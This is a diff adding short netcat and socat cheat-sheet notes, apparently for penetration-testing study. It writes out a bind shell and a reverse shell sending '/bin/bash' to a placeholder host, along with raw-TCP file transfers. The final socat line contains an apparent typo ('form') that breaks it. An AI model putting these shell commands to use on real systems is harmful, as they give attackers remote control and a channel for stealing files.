@@ -1,0 +1,22 @@
+netcat
+
+send a file
+nc -nlvp 4444 > incoming.exe
+nc -nv 1.2.3.4 4444 < file.txt
+
+nc -e --> allows redirection of I/O/E of an executable to a TCP/UDP port
+
+nc -nlvp 4444 -e cmd.exe
+
+nc -nv 1.2.3.4 4444 -e /bin/bash
+
+====================================
+
+socat
+
+socat - TCP4:1.2.3.4:80
+sudo socat TCP4-LISTEN:443 STDOUT
+
+file transfer
+sudo socat TCP4-LISTEN:443,form file:random.txt
+
